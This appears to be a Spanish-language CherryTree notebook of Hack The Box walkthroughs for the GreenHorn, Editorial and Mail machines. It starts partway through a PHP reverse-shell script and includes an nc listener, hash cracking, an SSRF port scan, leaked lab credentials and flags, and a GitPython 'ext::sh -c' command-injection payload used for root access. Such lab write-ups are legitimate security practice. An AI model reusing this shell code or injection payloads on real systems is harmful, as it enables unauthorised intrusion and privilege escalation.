stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);

printit("Successfully opened reverse shell to $ip:$port");

while (1) {
	// Check for end of TCP connection
	if (feof($sock)) {
		printit("ERROR: Shell connection terminated");
		break;
	}

	// Check for end of STDOUT
	if (feof($pipes[1])) {
		printit("ERROR: Shell process terminated");
		break;
	}

	// Wait until a command is end down $sock, or some
	// command output is available on STDOUT or STDERR
	$read_a = array($sock, $pipes[1], $pipes[2]);
	$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

	// If we can read from the TCP socket, send
	// data to process's STDIN
	if (in_array($sock, $read_a)) {
		if ($debug) printit("SOCK READ");
		$input = fread($sock, $chunk_size);
		if ($debug) printit("SOCK: $input");
		fwrite($pipes[0], $input);
	}

	// If we can read from the process's STDOUT
	// send data down tcp connection
	if (in_array($pipes[1], $read_a)) {
		if ($debug) printit("STDOUT READ");
		$input = fread($pipes[1], $chunk_size);
		if ($debug) printit("STDOUT: $input");
		fwrite($sock, $input);
	}

	// If we can read from the process's STDERR
	// send data down tcp connection
	if (in_array($pipes[2], $read_a)) {
		if ($debug) printit("STDERR READ");
		$input = fread($pipes[2], $chunk_size);
		if ($debug) printit("STDERR: $input");
		fwrite($sock, $input);
	}
}

fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);

// Like print, but does nothing if we've daemonised ourself
// (I can't figure out how to redirect STDOUT like a proper daemon)
function printit ($string) {
	if (!$daemon) {
		print "$string\n";
	}
}

?&gt; 



</cell>
            <cell>zip shellmd.zip shellmd.php</cell>
          </row>
          <row>
            <cell>shell</cell>
            <cell>comprimimos a zip</cell>
          </row>
        </table>
        <table char_offset="214" justification="left" col_min="60" col_max="60" col_widths="150">
          <row>
            <cell>sudo nc -lvnp 9001 </cell>
          </row>
          <row>
            <cell>comando</cell>
          </row>
        </table>
        <table char_offset="303" justification="left" col_min="60" col_max="60" col_widths="345">
          <row>
            <cell>python3 -c 'import pty;pty.spawn("/bin/bash")'</cell>
          </row>
          <row>
            <cell>comando</cell>
          </row>
        </table>
        <table char_offset="324" justification="left" col_min="60" col_max="60" col_widths="165">
          <row>
            <cell>export TERM=xterm</cell>
          </row>
          <row>
            <cell>comando</cell>
          </row>
        </table>
        <table char_offset="345" justification="left" col_min="60" col_max="60" col_widths="0">
          <row>
            <cell>cd home</cell>
          </row>
        </table>
        <table char_offset="369" justification="left" col_min="60" col_max="60" col_widths="0">
          <row>
            <cell>ls -la</cell>
          </row>
        </table>
        <table char_offset="406" justification="left" col_min="60" col_max="60" col_widths="0">
          <row>
            <cell>cd junior</cell>
          </row>
        </table>
        <table char_offset="472" justification="left" col_min="60" col_max="60" col_widths="90">
          <row>
            <cell>iloveyou1</cell>
          </row>
          <row>
            <cell>su junior</cell>
          </row>
        </table>
        <table char_offset="513" justification="left" col_min="60" col_max="60" col_widths="0">
          <row>
            <cell>acf371b081bd4e32d4cddcdf17b619e3</cell>
          </row>
        </table>
        <table char_offset="552" justification="left" col_min="60" col_max="60" col_widths="0">
          <row>
            <cell>mv 'Using OpenVAS.pdf' openvas.pdf</cell>
          </row>
        </table>
        <table char_offset="587" justification="left" col_min="60" col_max="60" col_widths="0">
          <row>
            <cell>python3 -m http.server 8888</cell>
          </row>
        </table>
        <table char_offset="633" justification="left" col_min="60" col_max="60" col_widths="0">
          <row>
            <cell>wget http://greenhorn.htb:8888/openvas.pdf</cell>
          </row>
        </table>
        <table char_offset="748" justification="left" col_min="60" col_max="60" col_widths="0">
          <row>
            <cell>pdfimages openvas.pdf op</cell>
          </row>
        </table>
        <table char_offset="825" justification="left" col_min="60" col_max="60" col_widths="0">
          <row>
            <cell>git clone https://github.com/spipm/Depix.git</cell>
          </row>
        </table>
        <table char_offset="891" justification="left" col_min="60" col_max="60" col_widths="0">
          <row>
            <cell>python3 depix.py \
    -p /home/kali/Documents/htb/machines/GreenHorn/op-000.ppm \
    -s images/searchimages/debruinseq_notepad_Windows10_closeAndSpaced.png \
    -o /home/kali/Documents/htb/machines/GreenHorn/output.png</cell>
          </row>
        </table>
        <table char_offset="926" justification="left" col_min="60" col_max="60" col_widths="0">
          <row>
            <cell>/home/kali/Documents/htb/machines/GreenHorn/output.png</cell>
          </row>
        </table>
        <table char_offset="1037" justification="left" col_min="60" col_max="60" col_widths="0">
          <row>
            <cell>sidefromsidetheothersidesidefromsidetheotherside</cell>
          </row>
        </table>
        <table char_offset="1141" justification="left" col_min="60" col_max="60" col_widths="0">
          <row>
            <cell>su root</cell>
          </row>
        </table>
      </node>
      <node unique_id="4" master_id="0" name="P 3000" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1722392066" ts_lastsave="1722400252">
        <rich_text justification="left"></rich_text>
        <rich_text>

</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>


</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>

</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>

correo:
</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>

</rich_text>
        <rich_text scale="h1">info enontrada en</rich_text>
        <rich_text>

</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>
</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>

analisis del cifrado
</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>

</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>

</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>

descubrimineto del tipo de cifrado
</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>

</rich_text>
        <table char_offset="0" justification="left" col_min="60" col_max="60" col_widths="0">
          <row>
            <cell>http://greenhorn.htb:3000/</cell>
          </row>
        </table>
        <table char_offset="3" justification="left" col_min="60" col_max="60" col_widths="375,465">
          <row>
            <cell>eyJuYW1lIjoiR3JlZW5Ib3JuIiwic2hvcnRfbmFtZSI6IkdyZWVuSG9ybiIsInN0YXJ0X3VybCI6Imh0dHA6Ly9ncmVlbmhvcm4uaHRiOjMwMDAvIiwiaWNvbnMiOlt7InNyYyI6Imh0dHA6Ly9ncmVlbmhvcm4uaHRiOjMwMDAvYXNzZXRzL2ltZy9sb2dvLnBuZyIsInR5cGUiOiJpbWFnZS9wbmciLCJzaXplcyI6IjUxMng1MTIifSx7InNyYyI6Imh0dHA6Ly9ncmVlbmhvcm4uaHRiOjMwMDAvYX</cell>
            <cell>{"name":"GreenHorn","short_name":"GreenHorn","start_url":"http://greenhorn.htb:3000/","icons":[{"src":"http://greenhorn.htb:3000/assets/img/logo.png","type":"image/png","sizes":"512x512"},{"src":"http://greenhorn.htb:3000/abase64: invalid input
</cell>
          </row>
          <row>
            <cell>base 64 capturado</cell>
            <cell>cat b64.txt | base64 -d</cell>
          </row>
        </table>
        <table char_offset="7" justification="left" col_min="60" col_max="60" col_widths="270,0,195">
          <row>
            <cell>whatweb -v -a 3 http://greenhorn.htb </cell>
            <cell>exitoso</cell>
            <cell>http://greenhorn.htb:3000</cell>
          </row>
          <row>
            <cell>Ataque</cell>
            <cell>resultado</cell>
            <cell>web</cell>
          </row>
        </table>
        <table char_offset="10" justification="left" col_min="60" col_max="60" col_widths="0">
          <row>
            <cell>HTTP Headers:
        HTTP/1.1 200 OK
        Cache-Control: max-age=0, private, must-revalidate, no-transform
        Content-Type: text/html; charset=utf-8
        Set-Cookie: i_like_gitea=4e68c65a757c8eef; Path=/; HttpOnly; SameSite=Lax
        Set-Cookie: _csrf=GsfLrDkktiIBO09tNp4yVE3VXVc6MTcyMjM5Mjc2MzM1ODYwMzkyOA; Path=/; Max-Age=86400; HttpOnly; SameSite=Lax
        X-Frame-Options: SAMEORIGIN
        Date: Wed, 31 Jul 2024 02:26:03 GMT
        Connection: close
        Transfer-Encoding: chunked
</cell>
          </row>
        </table>
        <table char_offset="21" justification="left" col_min="60" col_max="60" col_widths="0">
          <row>
            <cell>security@pluck-cms.org.</cell>
          </row>
        </table>
        <table char_offset="43" justification="left" col_min="60" col_max="60" col_widths="660,1140">
          <row>
            <cell>http://greenhorn.htb:3000/GreenAdmin/GreenHorn/src/branch/main/data/settings/pass.php</cell>
            <cell>&lt;?php
$ww = 'd5443aef1b64544f3685bf112f6c405218c573c7279a831b1fe9612e3a4d770486743c5580556c0d838b51749de15530f87fb793afdcc689b6b39024d7790163';
?&gt;</cell>
          </row>
          <row>
            <cell>ruta</cell>
            <cell>info</cell>
          </row>
        </table>
        <table char_offset="45" justification="left" col_min="60" col_max="60" col_widths="645,1170">
          <row>
            <cell>http://greenhorn.htb:3000/GreenAdmin/GreenHorn/src/branch/main/data/settings/token.php</cell>
            <cell>&lt;?php $token = '65c1e5cf86b4d727962672211b91924b828a0c05ece3954c75e3befa6b361fa3eb28c407f7101bc4eae2c604c96c641575c7fe82dbdc6ce0cf7d4a006f53bac7'; ?&gt;</cell>
          </row>
          <row>
            <cell>ruta</cell>
            <cell>info</cell>
          </row>
        </table>
        <table char_offset="69" justification="left" col_min="60" col_max="60" col_widths="1050,135">
          <row>
            <cell>name-that-hash -t "65c1e5cf86b4d727962672211b91924b828a0c05ece3954c75e3befa6b361fa3eb28c407f7101bc4eae2c604c96c641575c7fe82dbdc6ce0cf7d4a006f53bac7"</cell>
            <cell>sha-512, HC: 1700</cell>
          </row>
          <row>
            <cell>ataque</cell>
            <cell>resultado</cell>
          </row>
        </table>
        <table char_offset="72" justification="left" col_min="60" col_max="60" col_widths="405,75">
          <row>
            <cell>hashcat -m 1700 token.txt /usr/share/wordlists/rockyou.txt</cell>
            <cell>sin exito</cell>
          </row>
          <row>
            <cell>ataque</cell>
            <cell>estado</cell>
          </row>
        </table>
        <table char_offset="75" justification="left" col_min="60" col_max="60" col_widths="345,0">
          <row>
            <cell>https://10015.io/tools/sha256-encrypt-decrypt</cell>
            <cell>iloveyou1</cell>
          </row>
          <row>
            <cell>ataque</cell>
            <cell>resultado</cell>
          </row>
        </table>
        <table char_offset="113" justification="left" col_min="60" col_max="60" col_widths="690,495">
          <row>
            <cell>http://greenhorn.htb:3000/GreenAdmin/GreenHorn/src/branch/main/data/inc/security.php</cell>
            <cell>if (!file_exists('data/settings/token.php') &amp;&amp; is_writable('data/settings')) {
	$token = hash('sha512', uniqid(mt_rand(), true));
	$data = fopen('data/settings/token.php', 'w');
	fputs($data, '&lt;?php $token = \''.$token.'\'; ?&gt;');
	fclose($data);
	chmod('data/settings/token.php', 0777);
	unset($token);
}
</cell>
          </row>
          <row>
            <cell>ruta</cell>
            <cell>info</cell>
          </row>
        </table>
      </node>
    </node>
    <node unique_id="8" master_id="0" name="HTB editorial" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="#ffffff" ts_creation="1722558494" ts_lastsave="1724971675">
      <rich_text>ip = 10.10.11.20

reconocimiento 
</rich_text>
      <rich_text justification="left"></rich_text>
      <rich_text>

</rich_text>
      <rich_text justification="left"></rich_text>
      <rich_text>

nmap
</rich_text>
      <rich_text justification="left"></rich_text>
      <rich_text>

puertos descubiertos
</rich_text>
      <rich_text justification="left"></rich_text>
      <rich_text>

url
</rich_text>
      <rich_text justification="left"></rich_text>
      <rich_text>

sudo nano /etc/hosts
</rich_text>
      <rich_text justification="left"></rich_text>
      <rich_text>

abrir burpsuite

habilitar la opcion para interceptar la peticion

en la seccion de carga de la wen colocar en url el local host
</rich_text>
      <rich_text link="webs http://127.0.0.1">http://127.0.0.1</rich_text>
      <rich_text> darle al boton de prev

pasarlos al repeter

dentro de repeter darle al send

copiar el resultado es la imagen que esta por defecto en la web

</rich_text>
      <rich_text justification="left"></rich_text>
      <rich_text>

luego vamos a realizar un escaneo de puertos con ffuf

</rich_text>
      <rich_text justification="left"></rich_text>
      <rich_text>

obtenemos estado 200 en el puerto 5000

luego nuevamente dentro de burpsuite nos colocamos para interceptar

dentro de la web colocamos 
</rich_text>
      <rich_text justification="left"></rich_text>
      <rich_text>

capturamos y mandamos a repeter y luego send
obtenemos lo siguiente
</rich_text>
      <rich_text justification="left"></rich_text>
      <rich_text>

esto lo colocamos dentro de la web de la siguiente manera

</rich_text>
      <rich_text justification="left"></rich_text>
      <rich_text>

esto va a mostar una carga con error le damos click derecho y la imagen rota y le damos a abrir en una pesta;a nueva
eso nos va habilitar la descarga y descargamos

luego miramos el contenido

</rich_text>
      <rich_text justification="left"></rich_text>
      <rich_text>
 
 revisamos cada una de las url a ver que podemos obtener
 
 lo pegamos en la seccion de url de la web de la siguiente manera
  </rich_text>
      <rich_text justification="left"></rich_text>
      <rich_text>
  
 le damos en la imagen rota click derecho y abrir en una nueva pestala y descargamos
 revisamos el contenido 
 </rich_text>
      <rich_text justification="left"></rich_text>
      <rich_text>
 
 obtenemos el usuario y la contrase;a
 
 </rich_text>
      <rich_text justification="left"></rich_text>
      <rich_text>
 
 probamos estas credenciales en el ssh
 luego de ingresar vemos la primera flag
 </rich_text>
      <rich_text justification="left"></rich_text>
      <rich_text>
 
 ingresamos a la caropeta app
 
 y revisamos con 
 
 ls -la
 
 vemos una carpeta .git y ingresamos
 
 y vemos los log con git log
 
 luego vemos los comentarios con
 
 git show 
 
 el siguiente comentario nos trae algo relevante
 </rich_text>
      <rich_text justification="left"></rich_text>
      <rich_text>
 
 este es el resultado
 
 </rich_text>
      <rich_text justification="left"></rich_text>
      <rich_text>
 
 donde obtenemos las siguientes credenciales
 
 </rich_text>
      <rich_text justification="left"></rich_text>
      <rich_text>
 
 nos vamos a home y ejecutamos
 
 sudo -l
 
 para ver si encontramos algun tipo de permisos
 
 y vemos que tenemos permisos de un script en python
 
 </rich_text>
      <rich_text justification="left"></rich_text>
      <rich_text>
 
revisamos el contenido del scrip

</rich_text>
      <rich_text justification="left"></rich_text>
      <rich_text>

nos regresa lo siguiente
</rich_text>
      <rich_text justification="left"></rich_text>
      <rich_text>

identificamos que se esta usando la libreria de python para git

buscamos alguna vulnerabilidad para esta libreria

y encontramos algo en la siguiente ruta

</rich_text>
      <rich_text justification="left"></rich_text>
      <rich_text>

esta vulnerabilidad esta diponible para versiones de gitpython por debajo de la version 3.1.30

consultamo la version de la maquina victima

</rich_text>
      <rich_text justification="left"></rich_text>
      <rich_text>

resultado de la version

</rich_text>
      <rich_text justification="left"></rich_text>
      <rich_text>

por lo tanto es vulnerable

ingresamos a la siguiente ruta

</rich_text>
      <rich_text justification="left"></rich_text>
      <rich_text>

y ejecutamos el siguiente comando para ejecutar es pythn git

</rich_text>
      <rich_text justification="left"></rich_text>
      <rich_text>

una vez que se clono realizamo un cat del archivo clonado

</rich_text>
      <rich_text justification="left"></rich_text>
      <rich_text>

si el resultado manda error ejecutamos el sigueinte comando para redireccionar a root y recuperar el archivo descargado


</rich_text>
      <rich_text justification="left"></rich_text>
      <rich_text>

luego ejecutamos lo siguiente

</rich_text>
      <rich_text justification="left"></rich_text>
      <rich_text>

y obtenemos la ultima flag
</rich_text>
      <rich_text justification="left"></rich_text>
      <rich_text>




</rich_text>
      <table char_offset="34" justification="left" col_min="60" col_max="60" col_widths="0">
        <row>
          <cell>sudo nmap -sS -sV -A --min-rate 5000 --open -vvv -Pn 10.10.11.20</cell>
        </row>
      </table>
      <table char_offset="37" justification="left" col_min="60" col_max="60" col_widths="690">
        <row>
          <cell>22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.7 (Ubuntu Linux; protocol 2.0)</cell>
        </row>
        <row>
          <cell>80/tcp open  http    syn-ack ttl 63 nginx 1.18.0 (Ubuntu)</cell>
        </row>
        <row>
          <cell>puertos</cell>
        </row>
      </table>
      <table char_offset="45" justification="left" col_min="60" col_max="60" col_widths="0">
        <row>
          <cell>sudo nmap -sS -sV --min-rate 5000 -vvv -n -Pn 10.10.11.20</cell>
        </row>
      </table>
      <table char_offset="69" justification="left" col_min="60" col_max="60" col_widths="0,105">
        <row>
          <cell>80</cell>
          <cell>http</cell>
        </row>
        <row>
          <cell>22</cell>
          <cell>ssh</cell>
        </row>
      </table>
      <table char_offset="76" justification="left" col_min="60" col_max="60" col_widths="0">
        <row>
          <cell>http://editorial.htb/</cell>
        </row>
      </table>
      <table char_offset="100" justification="left" col_min="60" col_max="60" col_widths="0">
        <row>
          <cell>10.10.11.20 editorial.htb</cell>
        </row>
      </table>
      <table char_offset="392" justification="left" col_min="60" col_max="60" col_widths="0">
        <row>
          <cell>/static/images/unsplash_photo_1630734277837_ebe62757b6e0.jpeg</cell>
        </row>
      </table>
      <table char_offset="450" justification="left" col_min="60" col_max="60" col_widths="0">
        <row>
          <cell>ffuf -w /usr/share/wordlists/SecLists-master/Discovery/Infrastructure/common-http-ports.txt -request post.req -u http://editorial.htb/upload-cover -fs 61</cell>
        </row>
      </table>
      <table char_offset="590" justification="left" col_min="60" col_max="60" col_widths="0">
        <row>
          <cell>http://127.0.0.1:500</cell>
        </row>
      </table>
      <table char_offset="661" justification="left" col_min="60" col_max="60" col_widths="0">
        <row>
          <cell>static/uploads/859593e2-21ca-4ab7-9343-8ab25e6b253e</cell>
        </row>
      </table>
      <table char_offset="723" justification="left" col_min="60" col_max="60" col_widths="0">
        <row>
          <cell>http://127.0.0.1:5000/static/uploads/859593e2-21ca-4ab7-9343-8ab25e6b253e</cell>
        </row>
      </table>
      <table char_offset="919" justification="left" col_min="60" col_max="60" col_widths="330">
        <row>
          <cell>{"messages"
:[{"promotions":{"description":"Retrieve a list of all the promotions in our library.",
"endpoint":"/api/latest/metadata/messages/promos",
"methods":"GET"}},

{"coupons":{"description":"Retrieve the list of coupons to use in our library.",
"endpoint":"/api/latest/metadata/messages/coupons",
"methods":"GET"}},

{"new_authors":{"description":"Retrieve the welcome message sended to our new authors.",
"endpoint":"/api/latest/metadata/messages/authors",
"methods":"GET"}},

{"platform_use":{"description":"Retrieve examples of how to use the platform.",
"endpoint":"/api/latest/metadata/messages/how_to_use_platform","methods":"GET"}}],
"version":[{"changelog":{"description":"Retrieve a list of all the versions and updates of the api.",
"endpoint":"/api/latest/metadata/changelog","methods":"GET"}},

{"latest":{"description":"Retrieve the last version of api.",
"endpoint":"/api/latest/metadata",
"methods":"GET"}}]}</cell>
        </row>
      </table>
      <table char_offset="1050" justification="left" col_min="60" col_max="60" col_widths="0">
        <row>
          <cell>http://127.0.0.1:5000/api/latest/metadata/messages/authors</cell>
        </row>
      </table>
      <table char_offset="1166" justification="left" col_min="60" col_max="60" col_widths="60">
        <row>
          <cell>{"template_mail_message":
"Welcome to the team! We are thrilled to have you on board and can't wait to see the incredible content you'll bring to the table.
\n\nYour login credentials for our internal forum and authors site are
:\n     Username: dev
\n     Password: dev080217_devAPI!@
\nPlease be sure to change your password as soon as possible for security purposes.
\n\nDon't hesitate to reach out if you have any questions or ideas - we're always here to support you.
\n\nBest regards, Editorial Tiempo Arriba Team."}</cell>
        </row>
      </table>
      <table char_offset="1211" justification="left" col_min="60" col_max="60" col_widths="0,285">
        <row>
          <cell>dev</cell>
          <cell>dev080217_devAPI!@</cell>
        </row>
        <row>
          <cell>user</cell>
          <cell>password</cell>
        </row>
      </table>
      <table char_offset="1296" justification="left" col_min="60" col_max="60" col_widths="0">
        <row>
          <cell>93fad7da24f52bf4f56a700a881a894a</cell>
        </row>
      </table>
      <table char_offset="1530" justification="left" col_min="60" col_max="60" col_widths="0">
        <row>
          <cell>git show b73481bb823d2dfb49c44f4c1e6a7e11912ed8ae</cell>
        </row>
      </table>
      <table char_offset="1559" justification="left" col_min="60" col_max="60" col_widths="0">
        <row>
          <cell>'template_mail_message': 
"Welcome to the team! We are thrilled to have you on board and can't wait to see the incredible content you'll bring to the table.
\n\nYour login credentials for our internal forum and authors site are:
\nUsername: prod
\nPassword: 080217_Producti0n_2023!@
\nPlease be sure to change your password as soon as possible for security purposes.
\n\nDon't hesitate to reach out if you have any questions or ideas - we're always here to support you.
\n\nBest regards, " + api_editorial_name + " Team."</cell>
        </row>
      </table>
      <table char_offset="1611" justification="left" col_min="60" col_max="60" col_widths="0,0">
        <row>
          <cell>prod</cell>
          <cell>080217_Producti0n_2023!@</cell>
        </row>
      </table>
      <table char_offset="1765" justification="left" col_min="60" col_max="60" col_widths="0">
        <row>
          <cell>Matching Defaults entries for prod on editorial:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User prod may run the following commands on editorial:
    (root) /usr/bin/python3
        /opt/internal_apps/clone_changes/clone_prod_change.py *</cell>
        </row>
      </table>
      <table char_offset="1803" justification="left" col_min="60" col_max="60" col_widths="0">
        <row>
          <cell>cat /opt/internal_apps/clone_changes/clone_prod_change.py</cell>
        </row>
      </table>
      <table char_offset="1831" justification="left" col_min="60" col_max="60" col_widths="0">
        <row>
          <cell>change.py
#!/usr/bin/python3

import os
import sys
from git import Repo

os.chdir('/opt/internal_apps/clone_changes')

url_to_clone = sys.argv[1]

r = Repo.init('', bare=True)
r.clone_from(url_to_clone, 'new_changes', multi_options=["-c protocol.ext.allow=always"])
</cell>
        </row>
      </table>
      <table char_offset="1991" justification="left" col_min="60" col_max="60" col_widths="0">
        <row>
          <cell>https://security.snyk.io/vuln/SNYK-PYTHON-GITPYTHON-3113858</cell>
        </row>
      </table>
      <table char_offset="2135" justification="left" col_min="60" col_max="60" col_widths="0">
        <row>
          <cell>pip list | grep -i git</cell>
        </row>
      </table>
      <table char_offset="2163" justification="left" col_min="60" col_max="60" col_widths="0">
        <row>
          <cell>GitPython             3.1.29</cell>
        </row>
      </table>
      <table char_offset="2226" justification="left" col_min="60" col_max="60" col_widths="0">
        <row>
          <cell>cd /opt/internal_apps/clone_changes</cell>
        </row>
      </table>
      <table char_offset="2291" justification="left" col_min="60" col_max="60" col_widths="0">
        <row>
          <cell>sudo /usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py 'ext::sh -c touch% /tmp/pwned'</cell>
        </row>
      </table>
      <table char_offset="2353" justification="left" col_min="60" col_max="60" col_widths="0">
        <row>
          <cell>cat /tmp/pwned</cell>
        </row>
      </table>
      <table char_offset="2478" justification="left" col_min="60" col_max="60" col_widths="0">
        <row>
          <cell>sudo /usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py 'ext::sh -c cat% /root/root.txt% &gt;% /tmp/root'</cell>
        </row>
      </table>
      <table char_offset="2512" justification="left" col_min="60" col_max="60" col_widths="0">
        <row>
          <cell>cat /tmp/root</cell>
        </row>
      </table>
      <table char_offset="2542" justification="left" col_min="60" col_max="60" col_widths="0">
        <row>
          <cell>fbbfc7efcc71e980b05a39e713788b36</cell>
        </row>
      </table>
      <node unique_id="9" master_id="0" name="80" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1722559080" ts_lastsave="1722578170">
        <rich_text>web
</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>

ataque 
</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text> sin resultados comprometedores

</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text> sin resultado comprometedor

al revisar la web encunetro una seccion que nos pide hacer una carga de una imagen o una url que haga referencia auna porta de un libro

intenete colar una revershell en una imagen usando exiftool

</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text> pero esto no funciono

Investigando descubri el ataque RSSF es un ataque que nos permite intentar hacer peticiones al local host del equipo

en la seccion de la  url ingresamos el local host
</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>

con ayuda de burpsuite interseptamos la peticion y la pasamor a repeter
en repeter enviamos la peticion y recivimos del servidor la consulta con la imagen asociada

</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>

lo que quiere decir que en algun puerto se puede estar usando este servicio

mandamos la peticion interceptada a intruder

y en intruder preparamos un ataque de puertos

</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>

payload

</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>

</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>

por ultimo star atack y toca esperar un estado exitoso

encontramos estado 200 en 
</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>

volvemos a enviar la imagen y capturamos con burpsuite

esperamos en el history hhtp alguna respuesta y recibimos esto
</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>

vemos se puede hacer una peticiona una api
</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>

vamos a hacer esta consulta con bursuite a ver que nos regresa
</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>

respuesta
</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>


</rich_text>
        <table char_offset="4" justification="left" col_min="60" col_max="60" col_widths="0">
          <row>
            <cell>http://editorial.htb/upload</cell>
          </row>
        </table>
        <table char_offset="15" justification="left" col_min="60" col_max="60" col_widths="0">
          <row>
            <cell>whatweb -v -a 3 http://editorial.htb </cell>
          </row>
        </table>
        <table char_offset="49" justification="left" col_min="60" col_max="60" col_widths="0">
          <row>
            <cell>sudo dirb http://editorial.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</cell>
          </row>
        </table>
        <table char_offset="278" justification="left" col_min="60" col_max="60" col_widths="0">
          <row>
            <cell>exiftool -Commont="shell" imagen.png</cell>
          </row>
        </table>
        <table char_offset="471" justification="left" col_min="60" col_max="60" col_widths="0">
          <row>
            <cell>http://172.0.0.1/</cell>
          </row>
        </table>
        <table char_offset="639" justification="left" col_min="60" col_max="60" col_widths="0">
          <row>
            <cell>/static/images/unsplash_photo_1630734277837_ebe62757b6e0.jpeg</cell>
          </row>
        </table>
        <table char_offset="812" justification="left" col_min="60" col_max="60" col_widths="180">
          <row>
            <cell>http://127.0.0.1:§port§</cell>
          </row>
          <row>
            <cell>position</cell>
          </row>
        </table>
        <table char_offset="824" justification="left" col_min="60" col_max="60" col_widths="0,0">
          <row>
            <cell>1</cell>
            <cell>number</cell>
          </row>
          <row>
            <cell>peuload set</cell>
            <cell>payload type</cell>
          </row>
        </table>
        <table char_offset="827" justification="left" col_min="60" col_max="60" col_widths="0,0,0">
          <row>
            <cell>1</cell>
            <cell>65565</cell>
            <cell>1</cell>
          </row>
          <row>
            <cell>from</cell>
            <cell>to</cell>
            <cell>step</cell>
          </row>
        </table>
        <table char_offset="913" justification="left" col_min="60" col_max="60" col_widths="0">
          <row>
            <cell>http://127.0.01:5000</cell>
          </row>
        </table>
        <table char_offset="1035" justification="left" col_min="60" col_max="60" col_widths="90">
          <row>
            <cell>
{"messages":[{"promotions":{"description":"Retrieve a list of all the promotions in our library."
,"endpoint":"/api/latest/metadata/messages/promos",
"methods":"GET"}},{"coupons":{"description":"Retrieve the list of coupons to use in our library.",
"endpoint":"/api/latest/metadata/messages/coupons",
"methods":"GET"}},{"new_authors":{"description":"Retrieve the welcome message sended to our new authors.",
"endpoint":"/api/latest/metadata/messages/authors",
"methods":"GET"}},{"platform_use":{"description":"Retrieve examples of how to use the platform.",
"endpoint":"/api/latest/metadata/messages/how_to_use_platform",
"methods":"GET"}}],"version":[{"changelog":{"description":"Retrieve a list of all the versions and updates of the api.",
"endpoint":"/api/latest/metadata/changelog",
"methods":"GET"}},{"latest":{"description":"Retrieve the last version of api.",
"endpoint":"/api/latest/metadata","methods":"GET"}}]}
</cell>
          </row>
        </table>
        <table char_offset="1081" justification="left" col_min="60" col_max="60" col_widths="0">
          <row>
            <cell>/api/latest/metadata/messages/coupons</cell>
          </row>
        </table>
        <table char_offset="1147" justification="left" col_min="60" col_max="60" col_widths="0">
          <row>
            <cell>http://127.0.01:5000/api/latest/metadata/messages/authors</cell>
          </row>
        </table>
        <table char_offset="1160" justification="left" col_min="60" col_max="60" col_widths="0">
          <row>
            <cell>
[{"2anniversaryTWOandFOURread4":{"contact_email_2":"info@tiempoarriba.oc",
"valid_until":"12/02/2024"}},{"frEsh11bookS230":{"contact_email_2":"info@tiempoarriba.oc",
"valid_until":"31/11/2023"}}]</cell>
          </row>
        </table>
        <node unique_id="10" master_id="0" name="nota de ataque RSSF" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1722573242" ts_lastsave="1722573286">
          <rich_text>esta web es vulnerable a taque RSSF

url 
</rich_text>
          <rich_text justification="left"></rich_text>
          <table char_offset="42" justification="left" col_min="60" col_max="60" col_widths="0">
            <row>
              <cell>https://blog.hackmetrix.com/ssrf-server-side-request-forgery/</cell>
            </row>
          </table>
        </node>
      </node>
    </node>
    <node unique_id="14" master_id="0" name="Mail" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1724971132" ts_lastsave="1724971677">
      <rich_text>ip = 10.10.11.14

maquina window

escaneo de puertos
</rich_text>
      <rich_text justification="left"></rich_text>
      <rich_text>

resultado
</rich_text>
      <rich_text justification="left"></rich_text>
      <rich_text>
</rich_text>
      <rich_text justification="left"></rich_text>
      <table char_offset="53" justification="left" col_min="60" col_max="60" col_widths="0">
        <row>
          <cell>sudo nmap -sS -sV --min-rate 5000 -vvv -n -Pn 10.10.11.14</cell>
        </row>
      </table>
      <table char_offset="66" justification="left" col_min="60" col_max="60" col_widths="0">
        <row>
          <cell>PORT STATE SERVICE REASON VERSION
25/tcp open smtp syn-ack hMailServer smtpd
80/tcp open http syn-ack Microsoft IIS httpd 10.0
110/tcp open pop3 syn-ack hMailServer pop3d
135/tcp open msrpc syn-ack Microsoft Windows RPC
139/tcp open netbios-ssn syn-ack Microsoft Windows netbios-ssn
143/tcp open imap syn-ack hMailServer imapd
